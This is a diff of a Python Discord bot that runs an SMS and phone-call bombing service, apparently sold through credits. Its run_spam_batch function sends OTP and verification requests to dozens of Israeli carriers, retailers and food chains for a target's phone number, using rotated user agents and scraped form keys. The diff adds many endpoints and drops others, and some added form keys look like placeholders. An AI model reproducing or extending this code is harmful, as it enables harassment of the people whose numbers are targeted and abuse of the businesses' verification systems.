@@ -1,6 +1,6 @@
 import discord
 from discord import app_commands
-from discord.ext import commands
+from discord.ext import commands, tasks
 import asyncio
 import time
 import random
@@ -14,6 +14,8 @@ import os
 from datetime import datetime, timezone, timedelta
 import certifi
 import socket
+import json
+from collections import defaultdict
 
 TOKEN = os.getenv("DISCORD_TOKEN")
 MONGO_URI = os.getenv("MONGO_URI")
@@ -24,7 +26,6 @@ PANEL_CHANNEL = 1481957038241353779
 GIFT_CHANNEL = 1485104425625325709
 
 ADMIN_ROLE_ID = 1480762750052601886
-STAFF_ROLE_ID = 1480762750052601886
 
 COOLDOWN_TIME = 20
 MAX_CREDIT_SPEND = 100
@@ -57,6 +58,7 @@ logging.basicConfig(level=logging.WARNING)
 active_missions = {}
 cooldown_tracker = {}
 is_shutting_down = False
+stats_counter = defaultdict(int)
 
 BROWSER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0.0.0 Safari/537.36",
@@ -114,7 +116,7 @@ async def has_unlimited(user_id: int) -> bool:
     lifetime_record = await lifetime_collection.find_one({"_id": user_id})
     if lifetime_record:
         expires_at = lifetime_record.get("expires_at", 0)
-        if expires_at > time.time():
+        if expires_at == 0 or expires_at > time.time():
             return True
         else:
             await lifetime_collection.delete_one({"_id": user_id})
@@ -180,9 +182,6 @@ async def apply_cooldown(target: str):
     await cooldown_collection.update_one({"target": target}, {"$set": {"last_attempt": time.time()}}, upsert=True)
 
 def is_admin(interaction: discord.Interaction) -> bool:
-    return ADMIN_ROLE_ID in [role.id for role in interaction.user.roles]
-
-def is_staff(interaction: discord.Interaction) -> bool:
     return ADMIN_ROLE_ID in [role.id for role in interaction.user.roles]
 
 async def save_log(user_id: int, username: str, phone: str, cost: int, success: int, failed: int, duration: int, ip: str):
@@ -362,12 +361,13 @@ async def freeivr_request(session, phone):
     tag = "freeivr"
     formatted = f"972{phone[1:]}" if phone.startswith("0") else f"972{phone}"
     url = "https://f2.freeivr.co.il/api/v3/plugins/MitMValidPhone"
-    payload = {"phone": formatted}
+    payload = {"action": "Send", "phone": formatted}
     h = {
         "Content-Type": "application/json",
-        "User-Agent": random_agent(),
-        "Origin": "https://freeivr.co.il",
-        "Referer": "https://freeivr.co.il/"
+        "Accept": "application/json",
+        "Origin": "https://f2.freeivr.co.il",
+        "Referer": "https://f2.freeivr.co.il/register",
+        "User-Agent": random_agent()
     }
     try:
         timeout = aiohttp.ClientTimeout(total=5)
@@ -447,22 +447,47 @@ async def run_spam_batch(phone: str):
         geteat_fd.add_field("testing", "false")
         
         tasks = [
+            # Netfree
             send_request(s, "https://netfree.link/api/user/verify-phone/get-call",
                 json_data={"agreeTou": True, "phone": formatted},
                 headers_extra=json_headers("https://netfree.link", "https://netfree.link/welcome/", {"sec-fetch-site": "same-origin"}),
                 tag="netfree"),
+            # Claude
             claude_request(s, raw),
+            # Oshioshi
             oshioshi_request(s, raw),
+            # FreeTV
             freetv_request(s, raw),
+            # Webcut
             webcut_request(s, raw),
+            # FreeIVR
             freeivr_request(s, raw),
+            # Mitmachim
             mitmachim_request(s, raw),
+            
+            # ========== CELLULAR COMPANIES ==========
+            send_request(s, "https://www.pelephone.co.il/login/api/login/otpphone/",
+                json_data={"phone": raw, "terms": True, "appId": "DIGITALMy"}, tag="pelephone"),
+            send_request(s, "https://www.cellcom.co.il/api/auth/sms",
+                json_data={"phone": raw}, tag="cellcom"),
+            send_request(s, "https://www.partner.co.il/api/register",
+                json_data={"phone": raw}, tag="partner"),
+            send_request(s, "https://www.hotmobile.co.il/api/verify",
+                json_data={"phone": raw}, tag="hot"),
+            send_request(s, "https://www.bezeq.co.il/api/auth",
+                json_data={"phone": raw}, tag="bezeq"),
+            send_request(s, "https://019sms.co.il/api/register",
+                json_data={"phone": raw}, tag="019"),
+            
+            # ========== SUPERMARKETS ==========
             send_request(s, "https://www.shufersal.co.il/api/v1/auth/otp",
                 json_data={"phone": raw}, tag="shufersal"),
             send_request(s, "https://www.rami-levy.co.il/api/auth/sms",
                 json_data={"phone": raw}, tag="ramilevy"),
             send_request(s, "https://www.victory.co.il/api/auth/sms",
                 json_data={"phone": raw}, tag="victory"),
+            
+            # ========== FOOD CHAINS ==========
             send_request(s, "https://www.10bis.co.il/api/register",
                 json_data={"phone": raw}, tag="10bis"),
             send_request(s, "https://www.mcdonalds.co.il/api/verify",
@@ -477,6 +502,8 @@ async def run_spam_batch(phone: str):
                 json_data={"phone": raw}, tag="dominos"),
             send_request(s, "https://app.burgeranch.co.il/_a/aff_otp_auth",
                 form=f"phone={raw}", tag="burgeranch"),
+            
+            # ========== APPS & SERVICES ==========
             send_request(s, "https://api.pango.co.il/auth/otp",
                 json_data={"phoneNumber": raw}, tag="pango"),
             send_request(s, "https://api.hopon.co.il/v0.15/1/isr/users",
@@ -485,12 +512,22 @@ async def run_spam_batch(phone: str):
                 json_data={"phone": raw, "action": "send_sms"}, tag="yad2"),
             send_request(s, "https://payboxapp.com/api/auth/otp",
                 json_data={"phone": raw}, tag="paybox"),
-            send_request(s, "https://www.super-pharm.co.il/api/sms",
-                json_data={"phone": raw}, tag="superpharm"),
-            send_request(s, "https://www.zap.co.il/api/auth/sms",
-                json_data={"phone": raw}, tag="zap"),
+            send_request(s, "https://www.gett.com/il/wp-admin/admin-ajax.php",
+                data={"action": "business_reg_action", "phone": formatted, "first_name": "cyber", "last_name": "il", "work_email": random_email, "privacy_policy": "true"}, tag="gett"),
             send_request(s, "https://www.wolt.com/api/v1/verify",
                 json_data={"phone": raw}, tag="wolt"),
+            send_request(s, "https://femina.co.il/apps/feminaapp/auth/send-code",
+                json_data={"phone": raw}, tag="femina"),
+            send_request(s, "https://api.zygo.co.il/v2/auth/create-verify-token",
+                json_data={"phone": raw, "channel": "sms"}, tag="zygo"),
+            send_request(s, "https://proxy1.citycar.co.il/api/verify/login",
+                json_data={"phoneNumber": formatted, "verifyChannel": 2, "loginOrRegister": 1}, tag="citycar"),
+            send_request(s, "https://trusty.co.il/api/auth/ask-for-auth-code",
+                json_data={"email": "", "phone": raw, "process_name": "normal_login", "provider_api_key": "q4IcUNl"}, tag="trusty"),
+            send_request(s, "https://www.tami4.co.il/api/login/start-sms-otp",
+                json_data={"phoneNumber": raw, "cookieToken": str(int(time.time()*1000)) + "gciuvn5pcvhnext13", "isMobile": False}, tag="tami4"),
+            
+            # ========== RETAIL & FASHION ==========
             send_request(s, "https://www.negev-group.co.il/customer/ajax/post/",
                 form=f"form_key=a93dnWr8cjYH8wZ2&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
                 headers_extra=form_headers("https://www.negev-group.co.il", "https://www.negev-group.co.il/", {"sec-fetch-site": "same-origin"}),
@@ -507,248 +544,161 @@ async def run_spam_batch(phone: str):
                 form=f"form_key=OCYFcuUfiQLCbya5&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
                 headers_extra=form_headers("https://www.hoodies.co.il", "https://www.hoodies.co.il/"),
                 tag="hoodies"),
-            send_request(s, "https://api.gomobile.co.il/api/login",
-                json_data={"phone": raw},
-                headers_extra=json_headers("https://www.gomobile.co.il", "https://www.gomobile.co.il/"),
-                tag="gomobile"),
-            send_request(s, "https://bonitademas.co.il/apps/imapi-customer",
-                json_data={"action":"login","otpBy":"sms","otpValue":raw},
-                headers_extra=json_headers("https://bonitademas.co.il", "https://bonitademas.co.il/"),
-                tag="bonitademas"),
-            send_request(s, "https://story.magicetl.com/public/shopify/apps/otp-login/step-one",
-                json_data={"phone":raw},
-                headers_extra=json_headers("https://storyonline.co.il", "https://storyonline.co.il/"),
-                tag="storyonline"),
-            send_request(s, "https://www.crazyline.com/customer/ajax/post/",
-                form=f"form_key=qjDmQDc2pwYJIEin&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
-                headers_extra=form_headers("https://www.crazyline.com", "https://www.crazyline.com/"),
-                tag="crazyline"),
-            send_request(s, "https://authentication.wolt.com/v1/captcha/site_key_authenticated",
-                json_data={"phone_number": raw, "operation": "request_number_verification"},
-                headers_extra=json_headers("https://wolt.com", "https://wolt.com/"),
-                tag="wolt-captcha"),
-            send_request(s, "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber?uuid=4c48ed0d-9622-4a1e-ac70-2821631b680b&apiKey=BA6A19D2-F5BD-4B75-A080-6BD1E2FBEF54&sessionID=24014c96-61ca-4cd6-87a9-9324aa2f3150&culture=he_IL&apiVersion=2",
-                json_data={"phoneNumber": raw, "isCalling": True},
-                headers_extra=json_headers("https://www.mishloha.co.il", "https://www.mishloha.co.il/"),
-                tag="mishloha"),
-            send_request(s, "https://www.golfkids.co.il/customer/ajax/post/",
-                form=f"form_key=XB0c9tAkTouRgHrI&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
-                headers_extra=form_headers("https://www.golfkids.co.il", "https://www.golfkids.co.il/"),
-                tag="golfkids"),
-            send_request(s, "https://www.onot.co.il/customer/ajax/post/",
-                form=f"form_key=xmemtkBNMoUSLrMN&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
-                headers_extra=form_headers("https://www.onot.co.il", "https://www.onot.co.il/"),
-                tag="onot"),
-            send_request(s, "https://fox.co.il/apps/dream-card/api/proxy/otp/send",
-                json_data={"phoneNumber":raw,"uuid":"498d9bb2-0fa8-4d9c-9e71-f44fcbcd2195"},
-                headers_extra=json_headers("https://fox.co.il", "https://fox.co.il/"),
-                tag="fox"),
-            send_request(s, "https://www.foxhome.co.il/apps/dream-card/api/proxy/otp/send",
-                json_data={"phoneNumber":raw,"uuid":"6db5a63b-6882-414f-a090-de263dd917d7"},
-                headers_extra=json_headers("https://www.foxhome.co.il", "https://www.foxhome.co.il/"),
-                tag="foxhome"),
-            send_request(s, "https://www.laline.co.il/apps/dream-card/api/proxy/otp/send",
-                json_data={"phoneNumber":raw,"uuid":"ab29f239-0637-4c8e-8af5-fdfbaeb4b493"},
-                headers_extra=json_headers("https://www.laline.co.il", "https://www.laline.co.il/"),
-                tag="laline"),
-            send_request(s, "https://footlocker.co.il/apps/dream-card/api/proxy/otp/send",
-                json_data={"phoneNumber":raw,"uuid":"9961459f-9f83-4aab-9cee-58b1f6793547"},
-                headers_extra=json_headers("https://footlocker.co.il", "https://footlocker.co.il/"),
-                tag="footlocker"),
+            send_request(s, "https://www.delta.co.il/customer/ajax/post/",
+                form=f"form_key=abc123&bot_validation=1&type=login&telephone={raw}", tag="delta"),
+            send_request(s, "https://www.adikastyle.com/customer/ajax/post/",
+                form=f"form_key=xyz789&bot_validation=1&type=login&telephone={raw}", tag="adika"),
+            send_request(s, "https://www.weshoes.co.il/customer/ajax/post/",
+                form=f"form_key=def456&bot_validation=1&type=login&telephone={raw}", tag="weshoes"),
+            send_request(s, "https://www.fixunderwear.com/customer/ajax/post/",
+                form=f"form_key=ghi789&bot_validation=1&type=login&telephone={raw}", tag="fix"),
+            send_request(s, "https://www.kiwi-kids.co.il/customer/ajax/post/",
+                form=f"form_key=jkl012&bot_validation=1&type=login&telephone={raw}", tag="kiwi"),
+            send_request(s, "https://www.nautica.co.il/customer/ajax/post/",
+                form=f"form_key=mno345&bot_validation=1&type=login&telephone={raw}", tag="nautica"),
+            send_request(s, "https://www.lee-cooper.co.il/customer/ajax/post/",
+                form=f"bot_validation=1&type=login&telephone={raw}", tag="leecooper"),
+            send_request(s, "https://www.yvesrocher.co.il/customer/ajax/post/",
+                form=f"form_key=Orc69ELb5UOWEeBa&bot_validation=1&type=login&telephone={raw}", tag="yvesrocher"),
+            send_request(s, "https://www.victoriassecret.co.il/customer/ajax/post/",
+                form=f"form_key=thaSi85aLykcocT4&bot_validation=1&type=login&telephone={raw}", tag="victoria"),
+            send_request(s, "https://www.bathandbodyworks.co.il/customer/ajax/post/",
+                form=f"form_key=CqETdJMkaJsEneGf&bot_validation=1&type=login&telephone={raw}", tag="bathandbody"),
             send_request(s, "https://www.golfco.co.il/customer/ajax/post/",
-                form=f"form_key=SIiL0WFN6AtJF6lb&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
-                headers_extra=form_headers("https://www.golfco.co.il", "https://www.golfco.co.il/"),
-                tag="golfco"),
+                form=f"form_key=XEWGYBBTMOFgpPkO&bot_validation=1&type=login&telephone={raw}", tag="golfco"),
+            send_request(s, "https://www.golf-il.co.il/customer/ajax/post/",
+                form=f"form_key=golf123&bot_validation=1&type=login&telephone={raw}", tag="golf"),
+            send_request(s, "https://www.storyonline.co.il/customer/ajax/post/",
+                form=f"form_key=story456&bot_validation=1&type=login&telephone={raw}", tag="story"),
             send_request(s, "https://www.timberland.co.il/customer/ajax/post/",
-                form=f"form_key=gU7iqYv5eiwuKVef&bot_validation=1&type=login&phone={raw}",
-                headers_extra=form_headers("https://www.timberland.co.il", "https://www.timberland.co.il/"),
-                tag="timberland"),
-            send_request(s, "https://www.solopizza.org.il/_a/aff_otp_auth",
-                form=f"value={raw}&type=phone&projectId=1",
-                headers_extra=form_headers("https://www.solopizza.org.il", "https://www.solopizza.org.il/"),
-                tag="solopizza"),
-            send_request(s, "https://users-auth.hamal.co.il/auth/send-auth-code",
-                json_data={"value":raw,"type":"phone","projectId":"1"},
-                headers_extra=json_headers("https://hamal.co.il", "https://hamal.co.il/"),
-                tag="hamal"),
+                form=f"form_key=gU7iqYv5eiwuKVef&bot_validation=1&type=login&phone={raw}", tag="timberland"),
+            send_request(s, "https://www.onot.co.il/customer/ajax/post/",
+                form=f"form_key=xmemtkBNMoUSLrMN&bot_validation=1&type=login&telephone={raw}", tag="onot"),
             send_request(s, "https://www.urbanica-wh.com/customer/ajax/post/",
-                form=f"form_key=sucdtpszDEqdOgkv&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
-                headers_extra=form_headers("https://www.urbanica-wh.com", "https://www.urbanica-wh.com/"),
-                tag="urbanica"),
+                form=f"form_key=sucdtpszDEqdOgkv&bot_validation=1&type=login&telephone={raw}", tag="urbanica"),
+            send_request(s, "https://www.castro.com/customer/ajax/post/",
+                form=f"bot_validation=1&type=login&telephone={raw}", tag="castro"),
+            send_request(s, "https://www.crazyline.com/customer/ajax/post/",
+                form=f"form_key=qjDmQDc2pwYJIEin&bot_validation=1&type=login&telephone={raw}", tag="crazyline"),
+            send_request(s, "https://www.ninewest.co.il/customer/ajax/post/",
+                form=f"bot_validation=1&type=login&telephone={raw}", tag="ninewest"),
+            send_request(s, "https://www.kikocosmetics.co.il/customer/ajax/post/",
+                form=f"form_key=cGVPpkwnKsxyj9vB&bot_validation=1&type=login&telephone={raw}", tag="kiko"),
+            send_request(s, "https://www.topten-fashion.com/customer/ajax/post/",
+                form=f"form_key=H1eVw5PuOKdSD8D4&bot_validation=1&type=login&telephone={raw}", tag="topten"),
             send_request(s, "https://www.intima-il.co.il/customer/ajax/post/",
-                form=f"form_key=ppjX1yBLuS9rB7zZ&bot_validation=1&type=login&country_code=972&telephone={raw}&code=&compare_email=&compare_identity=",
-                headers_extra=form_headers("https://www.intima-il.co.il", "https://www.intima-il.co.il/"),
-                tag="intima"),
+                form=f"form_key=ppjX1yBLuS9rB7zZ&bot_validation=1&type=login&country_code=972&telephone={raw}", tag="intima"),
             send_request(s, "https://www.steimatzky.co.il/customer/ajax/post/",
-                form=f"form_key=4RmX16417urLzC5J&bot_validation=1&type=login&country_code=972&telephone={raw}&code=&compare_email=&compare_identity=",
-                headers_extra=form_headers("https://www.steimatzky.co.il", "https://www.steimatzky.co.il/"),
-                tag="steimatzky"),
+                form=f"form_key=4RmX16417urLzC5J&bot_validation=1&type=login&country_code=972&telephone={raw}", tag="steimatzky"),
+            send_request(s, "https://www.lilit.co.il/customer/ajax/post/",
+                form=f"form_key=sXWXnRwFsKy5YX9E&bot_validation=1&type=login&telephone={raw}", tag="lilit"),
+            send_request(s, "https://www.golbary.co.il/customer/ajax/post/",
+                form=f"form_key=w1deINjU3Ffpj8ct&bot_validation=1&type=login&telephone={raw}", tag="golbary"),
+            send_request(s, "https://www.lighting.co.il/customer/ajax/post/",
+                form=f"form_key=OoHXm6oGzca2WeJR&bot_validation=1&type=login&telephone={raw}", tag="lighting"),
+            
+            # ========== BEAUTY & COSMETICS ==========
+            send_request(s, "https://www.super-pharm.co.il/api/sms",
+                json_data={"phone": raw}, tag="superpharm"),
+            send_request(s, "https://www.zap.co.il/api/auth/sms",
+                json_data={"phone": raw}, tag="zap"),
+            send_request(s, "https://fox.co.il/apps/dream-card/api/proxy/otp/send",
+                json_data={"phoneNumber": raw, "uuid": "498d9bb2-0fa8-4d9c-9e71-f44fcbcd2195"}, tag="fox"),
+            send_request(s, "https://www.foxhome.co.il/apps/dream-card/api/proxy/otp/send",
+                json_data={"phoneNumber": raw, "uuid": "6db5a63b-6882-414f-a090-de263dd917d7"}, tag="foxhome"),
+            send_request(s, "https://www.laline.co.il/apps/dream-card/api/proxy/otp/send",
+                json_data={"phoneNumber": raw, "uuid": "ab29f239-0637-4c8e-8af5-fdfbaeb4b493"}, tag="laline"),
+            send_request(s, "https://footlocker.co.il/apps/dream-card/api/proxy/otp/send",
+                json_data={"phoneNumber": raw, "uuid": "9961459f-9f83-4aab-9cee-58b1f6793547"}, tag="footlocker"),
+            
+            # ========== MISC SERVICES ==========
+            send_request(s, "https://www.solopizza.org.il/_a/aff_otp_auth",
+                form=f"value={raw}&type=phone&projectId=1", tag="solopizza"),
+            send_request(s, "https://users-auth.hamal.co.il/auth/send-auth-code",
+                json_data={"value": raw, "type": "phone", "projectId": "1"}, tag="hamal"),
             send_request(s, "https://www.globes.co.il/news/login-2022/ajax_handler.ashx?get-value-type",
-                form=f"value={raw}&value_type=",
-                headers_extra=form_headers("https://www.globes.co.il", "https://www.globes.co.il/"),
-                tag="globes"),
+                form=f"value={raw}&value_type=", tag="globes"),
             send_request(s, "https://www.moraz.co.il/wp-admin/admin-ajax.php",
-                form=f"action=validate_user_by_sms&phone={raw}&email=&from_reg=false",
-                headers_extra=form_headers("https://www.moraz.co.il", "https://www.moraz.co.il/", {"sec-fetch-site": "same-origin"}),
-                tag="moraz"),
-            send_request(s, "https://itaybrands.co.il/apps/dream-card/api/proxy/otp/send",
-                json_data={"phoneNumber": raw, "uuid": sid},
-                headers_extra=json_headers("https://itaybrands.co.il", "https://itaybrands.co.il/", {"sec-fetch-site": "same-origin", "x-requested-with": "XMLHttpRequest"}),
-                tag="itaybrands"),
+                form=f"action=validate_user_by_sms&phone={raw}", tag="moraz"),
             send_request(s, "https://www.spicesonline.co.il/wp-admin/admin-ajax.php",
-                form=f"action=validate_user_by_sms&phone={raw}",
-                headers_extra=form_headers("https://www.spicesonline.co.il", "https://www.spicesonline.co.il/"),
-                tag="spicesonline"),
+                form=f"action=validate_user_by_sms&phone={raw}", tag="spicesonline"),
             send_request(s, "https://www.stepin.co.il/customer/ajax/post/",
-                form=f"form_key=BxItwcIQhlhsnaoi&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
-                headers_extra=form_headers("https://www.stepin.co.il", "https://www.stepin.co.il/"),
-                tag="stepin"),
+                form=f"form_key=BxItwcIQhlhsnaoi&bot_validation=1&type=login&telephone={raw}", tag="stepin"),
+            send_request(s, "https://itaybrands.co.il/apps/dream-card/api/proxy/otp/send",
+                json_data={"phoneNumber": raw, "uuid": sid}, tag="itaybrands"),
             send_request(s, "https://mobile.rami-levy.co.il/api/Helpers/OTP",
-                form=f"phone={raw}&template=OTP&type=1",
-                headers_extra={"Content-Type": "application/x-www-form-urlencoded", "accept-encoding": "gzip, deflate", "origin": "https://mobile.rami-levy.co.il", "referer": "https://mobile.rami-levy.co.il/", "x-requested-with": "XMLHttpRequest", "User-Agent": random_agent()},
-                tag="ramilevy-mobile"),
-            send_request(s, "https://api.zygo.co.il/v2/auth/create-verify-token",
-                json_data={"phone": raw},
-                headers_extra={"Content-Type": "application/json", "origin": "https://zygo.co.il", "referer": "https://zygo.co.il/", "accept-encoding": "gzip, deflate", "sec-fetch-site": "same-site"},
-                tag="zygo"),
+                form=f"phone={raw}&template=OTP&type=1", tag="ramilevy-mobile"),
             send_request(s, "https://ros-rp.tabit.cloud/services/loyalty/customerProfile/auth/mobile",
-                json_data={"mobile": raw},
-                headers_extra={"Content-Type": "application/json", "accept-encoding": "gzip, deflate", "accountguid": "0787F516-E97E-408A-A1CF-53D0C4D57C7C", "cpversion": "3.3.0", "env": "il", "joinchannelguid": "74FE1A48-0FA0-4C8F-B962-6AE88A242023", "siteid": "6203e7787694b434c7a7eb0a", "origin": "https://customer-profile.tabit.cloud", "referer": "https://customer-profile.tabit.cloud/", "sec-fetch-site": "same-site"},
-                tag="tabit"),
-            send_request(s, "GET", f"https://ivr.business/api/Customer/getTempCodeToPhoneVarification/{raw}",
-                headers_extra={"origin": "https://ivr.business", "referer": "https://ivr.business/", "accept-encoding": "gzip, deflate"},
-                tag="ivr"),
+                json_data={"mobile": raw}, tag="tabit"),
+            send_request(s, "GET", f"https://ivr.business/api/Customer/getTempCodeToPhoneVarification/{raw}", tag="ivr"),
             send_request(s, "POST", "https://www.call2all.co.il/ym/api/SelfCreateNewCustomer",
-                data={"configCode": "ivr2_10_23", "phone": raw, "sendCodeBy": "CALL", "step": "SendValidPhone"},
-                headers_extra={"origin": "https://www.call2all.co.il", "referer": "https://www.call2all.co.il/", "accept-encoding": "gzip, deflate"},
-                tag="call2all"),
+                data={"configCode": "ivr2_10_23", "phone": raw, "sendCodeBy": "CALL", "step": "SendValidPhone"}, tag="call2all"),
             send_request(s, "POST", "https://rest-api.dibs-app.com/otps",
-                json_data={"phoneNumber": formatted},
-                headers_extra=json_headers("https://dibs-app.com", "https://dibs-app.com/", {"sec-fetch-site": "same-site"}),
-                tag="dibs"),
-            send_request(s, "POST", "https://www.nine-west.co.il/customer/ajax/post/",
-                form=f"bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
-                headers_extra=form_headers("https://www.nine-west.co.il", "https://www.nine-west.co.il/"),
-                tag="ninewest"),
-            send_request(s, "POST", "https://www.leecooper.co.il/customer/ajax/post/",
-                form=f"bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
-                headers_extra=form_headers("https://www.leecooper.co.il", "https://www.leecooper.co.il/"),
-                tag="leecooper"),
-            send_request(s, "POST", "https://www.kikocosmetics.co.il/customer/ajax/post/",
-                form=f"bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
-                headers_extra=form_headers("https://www.kikocosmetics.co.il", "https://www.kikocosmetics.co.il/"),
-                tag="kiko"),
-            send_request(s, "POST", "https://www.topten-fashion.com/customer/ajax/post/",
-                form=f"form_key=soiphrLs3vM2A1Ta&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
-                headers_extra=form_headers("https://www.topten-fashion.com", "https://www.topten-fashion.com/"),
-                tag="topten"),
-            send_request(s, "POST", "https://www.lehamim.co.il/_a/aff_otp_auth",
-                form=f"phone={raw}",
-                headers_extra={**form_headers("https://www.lehamim.co.il", "https://www.lehamim.co.il/"), "sec-fetch-site": "same-origin"},
-                tag="lehamim"),
-            send_request(s, "POST", "https://www.555.co.il/ms/rest/otpservice/client/send/phone?contentContext=3&returnTo=/pearl/apps/vehicle-policy?insuranceTypeId=1",
-                json_data={"password": None, "phoneNr": raw, "sendType": 1, "systemType": None},
-                headers_extra=json_headers("https://www.555.co.il", "https://www.555.co.il/", {"sec-fetch-site": "same-origin"}),
-                tag="555"),
-            send_request(s, "POST", "https://www.jungle-club.co.il/wp-admin/admin-ajax.php",
-                form=f"action=simply-check-member-cellphone&cellphone={raw}",
-                headers_extra=form_headers("https://www.jungle-club.co.il", "https://www.jungle-club.co.il/"),
-                tag="jungleclub"),
-            send_request(s, "POST", "https://blendo.co.il/wp-admin/admin-ajax.php",
-                form=f"action=simply-check-member-cellphone&cellphone={raw}",
-                headers_extra=form_headers("https://blendo.co.il", "https://blendo.co.il/"),
-                tag="blendo"),
-            send_request(s, "POST", "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber",
-                json_data={"phoneNumber": raw, "sourceFrom": "AuthJS", "isCalling": True},
-                headers_extra=json_headers("https://mishloha.co.il", "https://mishloha.co.il/", {"sec-fetch-site": "same-site"}),
-                tag="mishloha2"),
-            send_request(s, "POST", "https://we.care.co.il/wp-admin/admin-ajax.php",
-                data=f"post_id=351178&form_id=7079d8dd&referer_title=Care&queried_id=351178&form_fields[name]=CyberIL&form_fields[phone]={raw}&form_fields[email]={random_email}&form_fields[accept]=on&action=elementor_pro_forms_send_form&referrer=https://we.care.co.il/",
-                headers_extra=form_headers("https://we.care.co.il", "https://we.care.co.il/glasses-tor/"),
-                tag="wecare"),
-            send_request(s, "POST", "https://www.matara.pro/nedarimplus/V6/Files/WebServices/DebitBit.aspx?Action=CreateTransaction",
-                form=f"MosadId=7000297&ClientName=CyberIL&Phone={raw}&Amount=100&Tashlumim=1",
-                headers_extra={"Content-Type": FORM_TYPE, "accept-encoding": "gzip, deflate", "referer": "https://www.matara.pro/", "origin": "https://www.matara.pro"},
-                tag="matara"),
-            send_request(s, "POST", "https://wissotzky-tlab.co.il/wp/wp-admin/admin-ajax.php",
-                form=f"action=otp_register&otp_phone={raw}&first_name=Cyber&last_name=IL&email={random_email}&date_birth=2000-11-11&approve_terms=true&approve_marketing=true",
-                headers_extra=form_headers("https://wissotzky-tlab.co.il", "https://wissotzky-tlab.co.il/"),
-                tag="wissotzky"),
-            send_request(s, "POST", "https://clocklb.ok2go.co.il/api/v2/users/login",
-                json_data={"phone": raw},
-                headers_extra=json_headers("https://clocklb.ok2go.co.il", "https://clocklb.ok2go.co.il/", {"sec-fetch-site": "same-origin"}),
-                tag="ok2go"),
-            send_request(s, "POST", "https://api-endpoints.histadrut.org.il/signup/send_code",
-                json_data={"phone": raw},
-                headers_extra={"Content-Type": "application/json", "accept-encoding": "gzip, deflate", "origin": "https://signup.histadrut.org.il", "referer": "https://signup.histadrut.org.il/", "x-api-key": "480317067f32f2fd3de682472403468da507b8d023a531602274d17d727a9189", "sec-fetch-site": "same-site"},
-                tag="histadrut"),
-            send_request(s, "POST", "https://www.papajohns.co.il/_a/aff_otp_auth",
-                form=f"phone={raw}",
-                headers_extra={**form_headers("https://www.papajohns.co.il", "https://www.papajohns.co.il/"), "sec-fetch-site": "same-origin"},
-                tag="papajohns"),
-            send_request(s, "POST", "https://www.iburgerim.co.il/_a/aff_otp_auth",
-                form=f"phone={raw}",
-                headers_extra={**form_headers("https://www.iburgerim.co.il", "https://www.iburgerim.co.il/"), "sec-fetch-site": "same-origin"},
-                tag="iburgerim"),
-            send_request(s, "GET", f"https://www.americanlaser.co.il/wp-json/calc/v1/send-sms?phone={raw}",
-                headers_extra={"referer": "https://www.americanlaser.co.il/calc/", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin", "accept-encoding": "gzip, deflate"},
-                tag="americanlaser"),
-            send_request(s, "POST", f"https://wb0lovv2z8.execute-api.eu-west-1.amazonaws.com/prod/api/v1/getOrdersSiteData?otpPhone={raw}",
-                json_data={"id": sid, "domain": "5fc39fabffae5ac5a229cebb", "action": "generateOneTimer", "phoneNumber": raw},
-                headers_extra=json_headers("https://orders.beecommcloud.com", "https://orders.beecommcloud.com/", {"sec-fetch-site": "cross-site"}),
-                tag="beecomm"),
-            send_request(s, "POST", "https://xtra.co.il/apps/api/inforu/sms",
-                json_data={"phoneNumber": raw},
-                headers_extra={"Content-Type": "application/json", "accept-encoding": "gzip, deflate", "origin": "https://xtra.co.il", "referer": "https://xtra.co.il/pages/brand/cafe-cafe", "sec-fetch-site": "same-origin"},
-                tag="xtra"),
-            send_request(s, "POST", "https://www.lighting.co.il/customer/ajax/post/",
-                form=f"form_key=OoHXm6oGzca2WeJR&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
-                headers_extra=form_headers("https://www.lighting.co.il", "https://www.lighting.co.il/"),
-                tag="lighting"),
-            send_request(s, "POST", "https://proxy1.citycar.co.il/api/verify/login",
-                json_data={"phoneNumber": formatted, "verifyChannel": 2, "loginOrRegister": 1},
-                headers_extra=json_headers("https://citycar.co.il", "https://citycar.co.il/", {"sec-fetch-site": "same-site"}),
-                tag="citycar"),
-            send_request(s, "POST", "https://www.lilit.co.il/customer/ajax/post/",
-                form=f"form_key=sXWXnRwFsKy5YX9E&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
-                headers_extra=form_headers("https://www.lilit.co.il", "https://www.lilit.co.il/"),
-                tag="lilit"),
-            send_request(s, "POST", "https://www.castro.com/customer/ajax/post/",
-                form=f"bot_validation=1&type=login&telephone={raw}",
-                headers_extra=form_headers("https://www.castro.com", "https://www.castro.com/"),
-                tag="castro"),
-            send_request(s, "POST", "https://www.bathandbodyworks.co.il/customer/ajax/post/",
-                form=f"form_key=ckGbaafzIC4Yi2l8&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
-                headers_extra=form_headers("https://www.bathandbodyworks.co.il", "https://www.bathandbodyworks.co.il/home"),
-                tag="bathandbody"),
-            send_request(s, "POST", "https://www.golbary.co.il/customer/ajax/post/",
-                form=f"form_key=w1deINjU3Ffpj8ct&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
-                headers_extra=form_headers("https://www.golbary.co.il", "https://www.golbary.co.il/"),
-                tag="golbary"),
-            send_request(s, "POST", "https://api.getpackage.com/v1/graphql/",
-                json_data={"operationName": "sendCheckoutRegistrationCode", "variables": {"userName": raw}, "query": "mutation sendCheckoutRegistrationCode($userName: String!) { sendCheckoutRegistrationCode(userName: $userName) { status __typename } }"},
